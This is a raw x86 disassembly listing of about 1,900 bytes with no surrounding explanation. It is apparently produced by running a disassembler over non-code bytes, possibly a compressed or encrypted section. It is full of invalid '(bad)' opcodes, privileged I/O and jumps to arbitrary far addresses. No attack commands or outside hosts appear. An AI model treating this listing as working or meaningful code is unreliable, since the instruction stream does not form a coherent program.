  4123ae:	mov    cs,WORD PTR [ecx+0xd]
  4123b1:	cld    
  4123b2:	mov    eax,ds:0x979f6b0
  4123b7:	inc    edx
  4123b8:	sbb    DWORD PTR [edi+0x4ff87b03],esp
  4123be:	shl    BYTE PTR [esi+0x5a419680],1
  4123c4:	int3   
  4123c5:	mov    ecx,DWORD PTR [esi+edi*1-0x6a]
  4123c9:	pop    edi
  4123ca:	mov    edx,0xeefe0ec3
  4123cf:	in     eax,0x8f
  4123d1:	dec    edi
  4123d2:	mov    eax,0xe8ad1369
  4123d7:	jle    0x4123ca
  4123d9:	jle    0x4123ae
  4123db:	loopne 0x41237d
  4123dd:	mov    bl,0x55
  4123df:	cmp    dh,BYTE PTR [ecx+0x7c]
  4123e2:	sbb    cl,BYTE PTR [ecx+0x6f]
  4123e5:	sbb    al,0x42
  4123e7:	ss out 0xa9,al
  4123ea:	std    
  4123eb:	ja     0x412444
  4123ed:	push   cs
  4123ee:	push   ecx
  4123ef:	mov    ebx,0xd4c40c3d
  4123f4:	(bad)  
  4123f6:	jecxz  0x41239a
  4123f8:	cmc    
  4123f9:	lahf   
  4123fa:	xchg   ecx,eax
  4123fb:	adc    ah,dl
  4123fd:	cmp    DWORD PTR [ecx-0x44],0xffffffeb
  412401:	xor    eax,0x2952e224
  412406:	pop    esp
  412407:	sahf   
  412408:	fisub  DWORD PTR [eax-0x66]
  41240b:	pop    esp
  41240c:	dec    ebp
  41240d:	xchg   edi,edx
  41240f:	test   eax,0x981b20df
  412414:	retf   
  412415:	loop   0x4123ea
  412417:	ret    0xd4dc
  41241a:	test   DWORD PTR [edi+0x7af19b93],0x1ffff57b
  412424:	push   es
  412425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412426:	int3   
  412427:	mov    al,ds:0x9adcc97e
  41242c:	enter  0x1765,0x4f
  412430:	lods   eax,DWORD PTR ds:[esi]
  412431:	aas    
  412432:	or     al,bl
  412434:	cs test esi,esp
  412437:	std    
  412438:	aam    0x7a
  41243a:	(bad)  
  41243b:	fiadd  DWORD PTR [eax-0x646246fe]
  412441:	fwait
  412442:	add    dl,BYTE PTR [edx]
  412444:	inc    edi
  412445:	add    BYTE PTR [bx+di-0x60],al
  412449:	js     0x41242c
  41244b:	pop    ecx
  41244c:	xchg   edx,eax
  41244d:	push   ebx
  41244e:	inc    ebp
  41244f:	pop    edi
  412450:	or     DWORD PTR [edx+edi*8-0x58b8de4b],eax
  412457:	mov    DWORD PTR [edi+0x1cee6b36],edi
  41245d:	in     al,0xe
  41245f:	dec    ebx
  412460:	test   DWORD PTR [esi+edx*8-0x7c9b4c96],esp
  412467:	(bad)  
  412468:	xchg   esp,eax
  412469:	call   0x27290be9
  41246e:	scas   al,BYTE PTR es:[edi]
  41246f:	in     al,0x27
  412471:	aas    
  412472:	ret    
  412473:	jbe    0x41245f
  412475:	(bad)  
  412476:	xchg   esi,eax
  412477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412478:	xchg   ebx,eax
  412479:	stc    
  41247a:	loope  0x412429
  41247c:	inc    esp
  41247d:	in     al,dx
  41247e:	or     DWORD PTR [ebx],ebx
  412480:	ret    
  412481:	cmp    al,0xd0
  412483:	or     ebx,edx
  412485:	mov    ecx,0xde19f9c1
  41248a:	jbe    0x412499
  41248c:	popf   
  41248d:	dec    ecx
  41248e:	imul   BYTE PTR [eax]
  412490:	popf   
  412491:	outs   dx,DWORD PTR ds:[esi]
  412492:	sti    
  412493:	xchg   BYTE PTR [ebx+ebx*2],bh
  412496:	mov    ?,WORD PTR ds:0xf90ca4bf
  41249c:	ror    ah,cl
  41249e:	inc    edi
  41249f:	cmp    bl,BYTE PTR [ecx]
  4124a1:	inc    esp
  4124a2:	mov    ebx,ss
  4124a4:	arpl   WORD PTR [eax-0x5e],cx
  4124a7:	dec    ecx
  4124a8:	and    ebp,ebx
  4124aa:	dec    ebx
  4124ab:	sbb    eax,0x217106
  4124b0:	scas   eax,DWORD PTR es:[edi]
  4124b1:	lds    esp,FWORD PTR [ebx+0x4c]
  4124b4:	mov    ch,0x4c
  4124b6:	ds xchg ebx,eax
  4124b8:	add    esi,edx
  4124ba:	cld    
  4124bb:	jns    0x4124bc
  4124bd:	jg     0x412490
  4124bf:	mov    eax,ds:0xe95d8672
  4124c4:	iret   
  4124c5:	xor    BYTE PTR [edx+edi*2-0x1e],dl
  4124c9:	dec    edi
  4124ca:	ror    BYTE PTR [eax+0x719a7751],0xe9
  4124d1:	adc    DWORD PTR [ebp-0x2209637],ebp
  4124d7:	mov    eax,ds:0x5078dc8a
  4124dc:	inc    esi
  4124dd:	pop    esi
  4124de:	cmp    ecx,eax
  4124e0:	inc    esp
  4124e1:	dec    edx
  4124e2:	add    DWORD PTR [ebx-0x54372e1d],0x4d98b86e
  4124ec:	jns    0x4124e1
  4124ee:	jle    0x412492
  4124f0:	jb     0x4124ef
  4124f2:	in     al,dx
  4124f3:	sbb    bl,BYTE PTR [edi]
  4124f5:	bound  ebx,QWORD PTR [eax]
  4124f7:	lods   eax,DWORD PTR ds:[esi]
  4124f8:	sub    edx,DWORD PTR [ecx]
  4124fa:	add    BYTE PTR [edx+0x54f27671],dh
  412500:	aaa    
  412501:	push   ebx
  412502:	repnz sub BYTE PTR [eax+0x66],al
  412506:	mov    cl,0x14
  412508:	pop    edx
  412509:	iret   
  41250a:	call   0x3320:0x6b99a13a
  412511:	sbb    bh,ch
  412513:	pmulhw mm3,QWORD PTR fs:[edx]
  412517:	jns    0x412586
  412519:	jne    0x412504
  41251b:	sbb    bl,BYTE PTR [ebx+0x7]
  41251e:	out    dx,eax
  41251f:	(bad)  
  412520:	pop    esp
  412521:	jbe    0x4124cc
  412523:	(bad)  
  412524:	mov    eax,ds:0x232be8d2
  412529:	ins    DWORD PTR es:[edi],dx
  41252a:	xor    ebx,edx
  41252c:	push   ecx
  41252d:	jnp    0x4124d3
  41252f:	nop
  412530:	sub    BYTE PTR [ebp-0x45],ch
  412533:	inc    ebp
  412534:	sti    
  412535:	lock jp 0x412566
  412538:	fimul  WORD PTR [ecx-0x61]
  41253b:	in     eax,0x72
  41253d:	mov    ebp,ss
  41253f:	aaa    
  412540:	sbb    al,0xe
  412542:	push   esi
  412543:	ja     0x412580
  412545:	and    DWORD PTR ds:0x8a314946,esp
  41254b:	jne    0x412525
  41254d:	add    al,0x0
  41254f:	ds jae 0x4125b7
  412552:	mov    al,es:0x2fa81cf6
  412558:	and    al,0xb1
  41255a:	daa    
  41255b:	jo     0x41256b
  41255d:	cmp    ebp,ebx
  41255f:	sbb    BYTE PTR [ebp-0x78],al
  412562:	fcomp  st(6)
  412564:	mov    edx,DWORD PTR [ebp+0x1]
  412567:	test   eax,0xcb171e94
  41256c:	xor    eax,0x6890f49c
  412571:	lock imul ecx,ebx,0xeeeb3833
  412578:	jno    0x412574
  41257a:	pop    ds
  41257b:	aas    
  41257c:	inc    DWORD PTR [edx-0x3e]
  41257f:	adc    ebp,DWORD PTR [ecx]
  412581:	pusha  
  412582:	push   edx
  412583:	mov    ecx,0x971bef70
  412588:	sub    bl,al
  41258a:	fld    DWORD PTR [eax]
  41258c:	dec    eax
  41258d:	int3   
  41258e:	jae    0x4125dd
  412590:	fbstp  TBYTE PTR [esp+edx*4+0x4d4a5807]
  412597:	loope  0x412525
  412599:	push   edx
  41259b:	pop    ecx
  41259c:	jbe    0x41255a
  41259e:	xchg   esp,eax
  41259f:	mov    bh,0xd5
  4125a1:	push   ebp
  4125a2:	mov    ebp,0xe72a5b3f
  4125a7:	sti    
  4125a8:	jb     0x412535
  4125aa:	sub    edi,eax
  4125ac:	and    cl,BYTE PTR cs:[esi-0x24]
  4125b0:	add    DWORD PTR ds:0xe357c59e,eax
  4125b6:	adc    DWORD PTR [ebx],edi
  4125b8:	jecxz  0x4125f7
  4125ba:	inc    ebx
  4125bb:	add    al,0xdc
  4125bd:	add    al,al
  4125bf:	jecxz  0x41259d
  4125c1:	into   
  4125c2:	xor    DWORD PTR [eax-0xced5779],0x7d
  4125c9:	lods   eax,DWORD PTR ds:[esi]
  4125ca:	shr    esp,1
  4125cc:	popa   
  4125cd:	and    al,dl
  4125cf:	push   es
  4125d0:	fcomp  QWORD PTR [edx]
  4125d2:	retf   
  4125d3:	out    0xaf,eax
  4125d5:	ds gs sti 
  4125d8:	stos   DWORD PTR es:[edi],eax
  4125d9:	sbb    eax,0xb1cc2fd1
  4125de:	push   ebx
  4125df:	pop    esp
  4125e0:	cmp    al,0xc5
  4125e2:	aam    0x5
  4125e4:	rcl    bh,0x8c
  4125e7:	jmp    0x9f22:0xf07da49c
  4125ee:	lds    esi,FWORD PTR [edi-0x356199aa]
  4125f4:	ss enter 0x44d7,0xb3
  4125f9:	cs sbb eax,0x4c4888f6
  4125ff:	pop    edi
  412600:	ret    
  412601:	pop    ds
  412602:	repnz and eax,0xf2696fbd
  412608:	jl     0x4125dc
  41260a:	add    eax,0x76650c0
  41260f:	pop    esi
  412610:	inc    esp
  412611:	pusha  
  412612:	pop    edx
  412613:	addr16 aad 0x8f
  412616:	pushf  
  412617:	jg     0x4125ad
  412619:	dec    ecx
  41261a:	xchg   ebp,eax
  41261b:	pop    ss
  41261c:	daa    
  41261d:	lods   al,BYTE PTR gs:[esi]
  41261f:	xchg   edx,eax
  412620:	mov    dh,0x24
  412622:	xchg   edx,eax
  412623:	or     bh,BYTE PTR [ecx-0x49]
  412626:	mov    bh,0x23
  412628:	add    BYTE PTR ds:0x102c1e67,ch
  41262e:	mov    ecx,0x74de1189
  412633:	lock add DWORD PTR [ebx+0x69a1622b],edi
  41263a:	push   edi
  41263b:	mov    cl,0x55
  41263d:	jns    0x41268b
  41263f:	or     esi,DWORD PTR [esi+0x7c]
  412642:	cmp    eax,0xbb9d26ce
  412647:	test   DWORD PTR [ebx+0x4e],esp
  41264a:	sub    al,0x76
  41264c:	lods   eax,DWORD PTR ds:[esi]
  41264d:	sbb    BYTE PTR [ebx-0x6e],ch
  412650:	xchg   DWORD PTR [esi],ebp
  412652:	les    esp,FWORD PTR [edi+edx*4-0x52]
  412656:	repnz bnd ja 0x41262e
  41265a:	fstp   DWORD PTR [edx-0x46]
  41265d:	adc    dh,BYTE PTR [ebx+0x67]
  412660:	lods   eax,DWORD PTR ds:[esi]
  412661:	fild   WORD PTR [edx]
  412663:	ins    BYTE PTR es:[edi],dx
  412664:	sbb    al,BYTE PTR [esi]
  412666:	adc    al,0xba
  412668:	jecxz  0x412622
  41266a:	retf   
  41266b:	mov    al,ah
  41266d:	xchg   ebp,eax
  41266e:	ja     0x412623
  412670:	pop    ds
  412671:	rcl    ebp,1
  412673:	jmp    0xe579:0xffa9879
  41267a:	repz test al,0x14
  41267d:	rcl    DWORD PTR [ecx],0x2e
  412680:	inc    ebx
  412681:	stos   DWORD PTR es:[edi],eax
  412682:	jl     0x4126e8
  412684:	adc    DWORD PTR [edi-0x344b9aa7],edx
  41268a:	lock sbb eax,0x4028ed4f
  412690:	(bad)  [esp+ebp*8+0x7b72d856]
  412697:	dec    edi
  412698:	pop    ebp
  412699:	xchg   DWORD PTR [esi+0x1e],edx
  41269c:	inc    esp
  41269d:	mov    bl,0x6c
  41269f:	test   al,0x5a
  4126a1:	ins    DWORD PTR es:[edi],dx
  4126a2:	or     al,0xbc
  4126a4:	pop    es
  4126a5:	fwait
  4126a6:	(bad)
  4126aa:	sub    al,0x7e
  4126ac:	dec    ecx
  4126ad:	(bad)
  4126b0:	xchg   esp,eax
  4126b1:	rol    esi,1
  4126b3:	mov    ecx,0x4b4de8cd
  4126b8:	scas   eax,DWORD PTR es:[edi]
  4126b9:	push   ebp
  4126ba:	mov    edx,0x6cd4c57d
  4126bf:	psadbw mm5,QWORD PTR [ecx-0x53]
  4126c3:	add    edx,DWORD PTR [ebx-0x3258cc8f]
  4126c9:	aas    
  4126ca:	mov    ebx,0x5c71a8db
  4126cf:	clc    
  4126d0:	or     BYTE PTR [ebx+0x3ed8e891],cl
  4126d6:	and    DWORD PTR [edi],eax
  4126d8:	outs   dx,BYTE PTR ds:[esi]
  4126d9:	sub    al,0x60
  4126db:	mov    ebx,0xad9402f0
  4126e0:	dec    esp
  4126e1:	adc    BYTE PTR [edx+0x9],0xe8
  4126e5:	in     eax,dx
  4126e6:	adc    dl,BYTE PTR [edi+0x21aff79d]
  4126ec:	dec    esi
  4126ed:	and    esi,edx
  4126ef:	push   edx
  4126f0:	add    esp,eax
  4126f2:	cmc    
  4126f3:	jne    0x412697
  4126f5:	jo     0x41267b
  4126f7:	or     DWORD PTR [ecx],ebp
  4126f9:	mov    BYTE PTR [edi-0x34],0xe1
  4126fd:	mov    ebx,0x195fd5f8
  412702:	push   cs
  412703:	push   ss
  412704:	leave  
  412705:	retf   
  412706:	pop    es
  412707:	out    0x1d,al
  412709:	cld    
  41270a:	dec    esp
  41270b:	inc    eax
  41270c:	mov    ebx,0x4d49008b
  412711:	aad    0x57
  412713:	int    0x84
  412715:	jno    0x4126b1
  412717:	test   al,0xb2
  412719:	retf   0x64a7
  41271c:	(bad)  
  41271d:	in     eax,dx
  41271e:	inc    eax
  41271f:	pusha  
  412720:	lea    ebp,[ebp+0x58536429]
  412726:	mov    ds:0x58440760,al
  41272b:	ret    
  41272c:	fcom   QWORD PTR [eax]
  41272e:	repz pusha 
  412730:	and    eax,0xc5095c6b
  412735:	in     eax,dx
  412736:	xchg   dh,ah
  412738:	loopne 0x412793
  41273a:	push   cs
  41273b:	fwait
  41273c:	test   DWORD PTR [eax+0x3e],edx
  41273f:	and    eax,DWORD PTR [eax]
  412741:	jbe    0x4126cd
  412743:	inc    ecx
  412744:	in     al,dx
  412745:	dec    esi
  412746:	xabort 0x9f
  412749:	mov    ch,0x38
  41274b:	dec    eax
  41274c:	arpl   WORD PTR [ecx+0x1e],dx
  41274f:	xchg   ebx,eax
  412750:	mov    fs,WORD PTR ds:[eax-0x347004ea]
  412757:	test   al,0xa6
  412759:	loop   0x412739
  41275b:	sbb    eax,0x4b5edb67
  412760:	not    DWORD PTR [ebp+0x3f]
  412763:	mov    ch,0x58
  412765:	(bad)  
  412767:	and    al,BYTE PTR [ebx]
  412769:	push   ss
  41276a:	in     al,dx
  41276b:	imul   esp,DWORD PTR [ecx+eiz*2-0x36],0xffffffe7
  412770:	je     0x4127a5
  412772:	xchg   ecx,eax
  412773:	push   ebp
  412774:	in     eax,dx
  412775:	gs mov al,0xb3
  412778:	xor    ch,al
  41277a:	scas   al,BYTE PTR es:[edi]
  41277b:	enter  0xc510,0x11
  41277f:	mov    dl,0x79
  412781:	xchg   ecx,ebp
  412783:	pop    edi
  412784:	test   eax,0x8266c54
  412789:	pop    edi
  41278a:	and    bh,dl
  41278c:	aad    0x2f
  41278e:	in     al,dx
  41278f:	int    0x89
  412791:	ret    0x3324
  412794:	ins    BYTE PTR es:[edi],dx
  412795:	dec    esp
  412796:	jbe    0x41273a
  412798:	inc    esi
  412799:	add    al,0xf7
  41279b:	jo     0x412747
  41279d:	sub    al,0xca
  41279f:	lods   al,BYTE PTR ds:[esi]
  4127a0:	cmp    al,BYTE PTR [ecx+0x2a]
  4127a3:	jle    0x4127ed
  4127a5:	arpl   WORD PTR [esi-0x5c5ee1c0],cx
  4127ab:	mov    eax,ds:0x302914e6
  4127b0:	pop    ebp
  4127b1:	ins    BYTE PTR es:[edi],dx
  4127b2:	fcom   DWORD PTR [ebp+0x6249b646]
  4127b8:	pop    esp
  4127b9:	cmp    al,0x5f
  4127bb:	push   ss
  4127bc:	ret    
  4127bd:	adc    al,0x9
  4127bf:	jae    0x41281e
  4127c1:	inc    eax
  4127c2:	ss and ecx,ecx
  4127c5:	std    
  4127c6:	or     bh,BYTE PTR [edx]
  4127c8:	mov    dl,0x60
  4127ca:	(bad)  
  4127cb:	ficom  DWORD PTR [ebx-0xe]
  4127ce:	adc    eax,DWORD PTR [esi+0x2dc90d63]
  4127d4:	fisttp QWORD PTR [esi]
  4127d7:	pop    edx
  4127d8:	xchg   ecx,eax
  4127d9:	pop    edx
  4127da:	adc    ebx,ebp
  4127dc:	aad    0x27
  4127de:	div    ch
  4127e0:	sbb    DWORD PTR [ebp+0x247dd679],0x91b8bf38
  4127ea:	push   edi
  4127eb:	jbe    0x4127e8
  4127ed:	icebp  
  4127ee:	mov    edx,0xc6a04f7d
  4127f3:	pop    ss
  4127f4:	out    0xee,al
  4127f6:	jbe    0x4127ae
  4127f8:	inc    ebp
  4127f9:	jmp    0x9c0c:0x5d20dd4c
  412800:	mov    cl,0x3e
  412802:	add    eax,DWORD PTR [ebp-0x39]
  412805:	jbe    0x41287d
  412807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412808:	or     eax,DWORD PTR [ebx+0x486fea32]
  41280e:	idiv   DWORD PTR [esi]
  412810:	stc    
  412811:	sub    al,0xb0
  412813:	lea    esi,[edi-0x54]
  412816:	std    
  412817:	pop    esi
  412818:	mov    al,0x40
  41281a:	aam    0x6e
  41281c:	and    al,0x98
  41281e:	dec    ebp
  41281f:	sub    BYTE PTR [ebx],al
  412821:	rol    DWORD PTR [esp+ebp*1+0x37],cl
  412825:	retf   
  412826:	push   cs
  412827:	pop    ecx
  412828:	xchg   ebp,eax
  412829:	xchg   DWORD PTR [eax+0x76],ecx
  41282c:	out    0xd9,eax
  41282e:	xor    ebx,DWORD PTR [esi+eax*2-0x3a]
  412832:	xchg   esp,eax
  412833:	ds dec ecx
  412835:	cli    
  412836:	dec    esi
  412837:	es inc esp
  412839:	pop    ebx
  41283a:	prefetchnta BYTE PTR [ecx+ebp*4]
  41283e:	dec    eax
  41283f:	out    0xbc,al
  412841:	(bad)  
  412842:	add    DWORD PTR [ebp+0x2c437817],ebx
  412848:	test   al,0x47
  41284a:	and    al,0x67
  41284c:	es fdiv st(3),st
  41284f:	cli    
  412850:	pop    es
  412851:	push   eax
  412852:	scas   al,BYTE PTR es:[edi]
  412853:	mov    ecx,0xb0991a6a
  412858:	ficomp WORD PTR [ebx-0x30]
  41285b:	sbb    al,0x1c
  41285d:	mov    eax,0x27b416fe
  412862:	cmp    ch,BYTE PTR [eax+0x4f5b9268]
  412868:	dec    ebp
  412869:	(bad)  
  41286a:	pop    edx
  41286b:	call   0x58b0974d
  412870:	mov    dl,0x9f
  412872:	in     eax,dx
  412873:	dec    ebp
  412874:	jo     0x412857
  412876:	xlat   BYTE PTR ds:[ebx]
  412877:	mov    al,ds:0x730f4e9e
  41287c:	outs   dx,BYTE PTR ds:[esi]
  41287d:	pop    es
  41287e:	ins    DWORD PTR es:[edi],dx
  41287f:	popa   
  412880:	sub    eax,ebx
  412882:	jno    0x4128a6
  412884:	mov    es,eax
  412886:	push   ss
  412887:	push   0xffffffbd
  412889:	mov    esi,0xf5f180c
  41288e:	push   ebx
  41288f:	fsubr  QWORD PTR [edx]
  412891:	(bad)  
  412892:	sbb    ah,BYTE PTR [ebx+esi*1+0x5988735f]
  412899:	mov    ebp,0x839eff82
  41289e:	jne    0x41283f
  4128a0:	(bad)  
  4128a1:	inc    esi
  4128a2:	inc    eax
  4128a3:	mov    cl,BYTE PTR [eax+0x4924d838]
  4128a9:	scas   al,BYTE PTR es:[edi]
  4128aa:	pop    ds
  4128ab:	xchg   DWORD PTR ds:0xf2fe4329,ebx
  4128b1:	jl     0x41289a
  4128b3:	je     0x412904
  4128b5:	sbb    DWORD PTR [ebp+0x3cf1d225],ecx
  4128bb:	or     ah,bl
  4128bd:	in     al,0xe6
  4128bf:	lds    edx,FWORD PTR [eax]
  4128c1:	mov    ebp,0xe95cd8d2
  4128c6:	pushf  
  4128c7:	rcr    DWORD PTR ds:0x4387a89c,0xd0
  4128ce:	shl    DWORD PTR [edi+0x3e2cadc2],cl
  4128d4:	jle    0x4128a4
  4128d6:	adc    al,0x6c
  4128d8:	pop    esi
  4128d9:	sub    DWORD PTR [ebx+0x756414a7],esi
  4128df:	xor    al,0x23
  4128e1:	stos   BYTE PTR es:[edi],al
  4128e2:	add    DWORD PTR [ebx-0x3f],ebx
  4128e5:	jns    0x4128f8
  4128e7:	sbb    dh,BYTE PTR [ecx+0x2f]
  4128ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128eb:	call   0x9d988ae
  4128f0:	jb     0x41296a
  4128f2:	inc    esi
  4128f3:	retf   0x591f
  4128f6:	jb     0x41287e
  4128f8:	mov    dh,0x1b
  4128fa:	(bad)  
  4128fc:	(bad)  
  4128fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128fe:	dec    eax
  4128ff:	push   ebp
  412900:	mov    eax,ds:0x88816abb
  412905:	js     0x412913
  412907:	gs sub eax,0x65751e22
  41290d:	inc    ebp
  41290e:	sub    al,BYTE PTR ss:[ebx-0x3c522e98]
  412915:	movsx  edx,BYTE PTR [edi+0x348f0aeb]
  41291c:	xchg   ebp,eax
  41291d:	jmp    0x4128f7
  41291f:	stc    
  412920:	sbb    edx,DWORD PTR [edi+0x7f]
  412923:	popf   
  412924:	mov    ah,BYTE PTR [ebx+edi*4]
  412927:	loopne 0x4129a0
  412929:	fimul  WORD PTR [eax]
  41292b:	sbb    al,0xb5
  41292d:	fidiv  DWORD PTR [ebx]
  41292f:	aaa    
  412930:	mov    cs:0x331e0e27,eax
  412936:	ror    DWORD PTR [edx],1
  412938:	jbe    0x412918
  41293a:	mov    cl,0xc9
  41293c:	adc    ebp,DWORD PTR [esi-0x3cb14e44]
  412942:	push   edx
  412943:	mov    cl,0x70
  412945:	mov    ebx,0x74ecabb0
  41294a:	aam    0x52
  41294c:	inc    eax
  41294d:	and    DWORD PTR [ebx+0x9251092],esp
  412953:	aas    
  412954:	sub    eax,0x5f477c03
  412959:	jecxz  0x4129b0
  41295b:	(bad)  
  41295c:	popf   
  41295d:	xchg   edi,eax
  41295e:	pop    ss
  41295f:	test   al,0x20
  412961:	lock bound eax,QWORD PTR [ebx-0x30]
  412965:	mov    eax,ds:0xac85caec
  41296a:	cwde   
  41296b:	jmp    0x4129d4
  41296d:	xor    edi,DWORD PTR [ebx+0x57]
  412970:	inc    ebp
  412971:	or     al,bl
  412973:	xchg   esi,eax
  412974:	ins    DWORD PTR es:[edi],dx
  412975:	je     0x41292a
  412977:	fistp  DWORD PTR [edi+ecx*8-0x3d7a277f]
  41297e:	bound  ebp,QWORD PTR [edx+0x6a]
  412981:	inc    esi
  412982:	mov    ah,cl
  412984:	sub    eax,0x2348b9fd
  412989:	ret    0xc6e1
  41298c:	into   
  41298d:	stc    
  41298e:	inc    edi
  41298f:	nop
  412990:	(bad)  
  412991:	in     al,dx
  412992:	xchg   esp,eax
  412993:	lea    ebx,[edx]
  412995:	mov    esp,DWORD PTR [esi]
  412997:	jge    0x412960
  412999:	sbb    ah,BYTE PTR [ebx-0x68]
  41299c:	rcr    DWORD PTR [edi+0x21],0x7
  4129a0:	test   al,0xb9
  4129a2:	push   es
  4129a3:	in     eax,dx
  4129a4:	fdiv   QWORD PTR [ebx-0x66730484]
  4129aa:	sbb    al,0x5b
  4129ac:	out    0x92,eax
  4129ae:	loopne 0x4129a1
  4129b0:	ror    edi,0x8b
  4129b3:	int    0xe5
  4129b5:	cli    
  4129b6:	adc    BYTE PTR [ebx+0x1e],0x61
  4129ba:	pop    eax
  4129bb:	pop    eax
  4129bc:	daa    
  4129bd:	pop    eax
  4129be:	(bad)  
  4129bf:	int    0x7e
  4129c1:	pop    ebx
  4129c2:	lods   eax,DWORD PTR ds:[esi]
  4129c3:	jo     0x4129fc
  4129c5:	enter  0xcc89,0x42
  4129c9:	in     eax,dx
  4129ca:	pop    ss
  4129cb:	xchg   BYTE PTR [ebx],al
  4129cd:	out    dx,eax
  4129ce:	mov    ds,WORD PTR [edx-0x12]
  4129d1:	ret    0xb5c9
  4129d4:	out    dx,al
  4129d5:	jae    0x4129cf
  4129d7:	xchg   esp,eax
  4129d8:	lahf   
  4129d9:	lock mov ah,0xd3
  4129dc:	cmc    
  4129dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129de:	mov    al,0xde
  4129e0:	imul   ebx,DWORD PTR [ecx+0x40],0xe311b416
  4129e7:	dec    ebx
  4129e8:	push   cs
  4129e9:	jo     0x4129b8
  4129eb:	icebp  
  4129ec:	dec    edx
  4129ed:	test   BYTE PTR [ecx],ch
  4129ef:	mov    cl,0xb9
  4129f1:	scas   eax,DWORD PTR es:[edi]
  4129f2:	inc    edi
  4129f3:	xchg   ecx,eax
  4129f4:	sbb    esp,edi
  4129f6:	out    dx,al
  4129f7:	retf   0x4601
  4129fa:	ret    0x49b0
  4129fd:	mov    al,ds:0xc125a2f4
  412a02:	jle    0x4129ef
  412a04:	xchg   DWORD PTR [ebx],eax
  412a06:	mov    bh,0xa2
  412a08:	ja     0x41298f
  412a0a:	mov    bl,0xfc
  412a0c:	mov    esp,0xdd4ec520
  412a11:	repz aas 
  412a13:	inc    ebx
  412a14:	push   eax
  412a15:	sbb    eax,0x417fd62
  412a1a:	fisttp DWORD PTR [esp+eax*8+0x134e6dde]
  412a21:	je     0x4129d0
  412a23:	mov    ebx,0xdfecd1c
  412a28:	add    ah,BYTE PTR [esi+ebx*1]
  412a2b:	xchg   ebp,eax
  412a2c:	mov    bl,0x46
  412a2e:	(bad)  
  412a2f:	add    eax,0x44466893
  412a34:	bound  esp,QWORD PTR ds:0xb4d95ef5
  412a3a:	mov    ebp,0x12e48307
  412a3f:	mov    dl,0x6c
  412a41:	mov    dh,BYTE PTR [esi+0x3f]
  412a44:	push   ecx
  412a45:	ja     0x4129f3
  412a47:	leave  
  412a48:	test   dh,al
  412a4a:	je     0x412a5e
  412a4c:	push   edx
  412a4d:	call   FWORD PTR [esp+eax*2+0x39]
  412a51:	daa    
  412a52:	in     eax,dx
  412a53:	jecxz  0x412aa6
  412a55:	xlat   BYTE PTR ds:[ebx]
  412a56:	mov    ds:0xb495130f,eax
  412a5b:	data16 jecxz 0x412a34
  412a5e:	cmp    DWORD PTR [bp+si+0x696a],ecx
  412a63:	mov    esp,0x24b5ddc
  412a68:	inc    edx
  412a69:	in     eax,dx
  412a6a:	in     eax,dx
  412a6b:	jmp    0x4129f5
  412a6d:	sub    al,0x0
  412a6f:	call   0x36d61fbe
  412a74:	bswap  ebx
  412a76:	cmp    BYTE PTR [edi-0x75],ch
  412a79:	jmp    0x412a84
  412a7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a7c:	adc    bl,bh
  412a7e:	mov    ds:0x416d2c52,eax
  412a83:	xchg   esi,eax
  412a84:	or     al,0x64
  412a86:	cmp    bl,ch
  412a88:	or     al,0xd8
  412a8a:	jl     0x412abf
  412a8c:	(bad)  
  412a8d:	ins    BYTE PTR es:[edi],dx
  412a8e:	jl     0x412b04
  412a90:	gs daa 
  412a92:	mov    ah,0x35
  412a94:	shl    BYTE PTR [eax+0x54ad3b88],cl
  412a9a:	xchg   ebp,eax
  412a9b:	js     0x412a4f
  412a9d:	sbb    dh,bl
  412a9f:	push   es
  412aa0:	mov    WORD PTR [eax+esi*1-0x4d180025],fs
  412aa7:	pop    esp
  412aa8:	fcomip st,st(0)
  412aaa:	fistp  QWORD PTR [ecx+0x1d]
  412aad:	mov    dh,BYTE PTR ds:0x273fa1a9
  412ab3:	int    0x99
  412ab5:	mov    DWORD PTR [edi+edx*2-0x3ae0c273],edi
  412abc:	jp     0x412a88
  412abe:	jge    0x412a45
  412ac0:	lgs    esi,FWORD PTR [ebp+0x454dd464]
  412ac7:	xor    BYTE PTR [ebp-0x62],0x16
  412acb:	rol    dh,0x6c
  412ace:	mov    esp,0xd77dacc9
  412ad3:	scas   al,BYTE PTR es:[edi]
  412ad4:	aas    
  412ad5:	inc    esi
  412ad6:	ret    
  412ad7:	sub    al,0x3e
  412ad9:	mov    ecx,0x70aad1d5
  412ade:	mov    cl,0x15
  412ae0:	retf   0x9d30
  412ae3:	mov    eax,0xa680b9f1
  412ae8:	rcr    DWORD PTR [edi-0x6],1
  412aeb:	sar    DWORD PTR [esi-0x26f7dd3f],cl
  412af1:	addr16 aas 
  412af3:	pop    esp
  412af4:	gs cwde 
  412af6:	data16 das 
  412af8:	jb     0x412b39
  412afa:	sbb    al,0x46
  412afc:	mov    bh,0x63
  412afe:	iret   
  412aff:	or     DWORD PTR [eax+0x5c],ecx
  412b02:	jo     0x9c1169cf
  412b08:	mov    ?,WORD PTR es:[esi]
  412b0b:	xor    esi,DWORD PTR [edi-0x79edf2eb]
  412b11:	mov    WORD PTR [esi+edx*2],ds
  412b14:	retf   
  412b15:	mov    esp,0x15b40546
  412b1a:	push   eax
  412b1b:	aaa    
  412b1c:	aam    0x8d
  412b1e:	inc    ebx
  412b1f:	je     0x412aa5
  412b21:	cmc    
  412b22:	sub    eax,0x1c05585b
  412b27:	jb     0x412b10
  412b29:	lea    ecx,[esi]
  412b2b:	mov    WORD PTR [edx+0x2d],gs
  412b2e:	sub    eax,0x16021631
  412b33:	int    0xa4
  412b35:	adc    esi,DWORD PTR [ebx]
  412b37:	mov    DWORD PTR [esi-0x6],ecx
  412b3a:	(bad)  
  412b3c:	inc    edx
  412b3d:	jbe    0x412bbd
  412b3f:	adc    ch,bl
  412b41:	pushf  
  412b42:	jbe    0x412b34
  412b44:	popf   
  412b45:	or     al,0x2a
  412b47:	(bad)  
  412b4a:	dec    eax
  412b4b:	xchg   ebp,eax
  412b4c:	pop    eax
  412b4d:	retf   0xcdf0
  412b50:	sbb    al,0x6d
  412b52:	ins    DWORD PTR es:[edi],dx
  412b53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b54:	retf   
  412b55:	stc    
  412b56:	jns    0x412ae9
  412b58:	mov    ch,0xf8
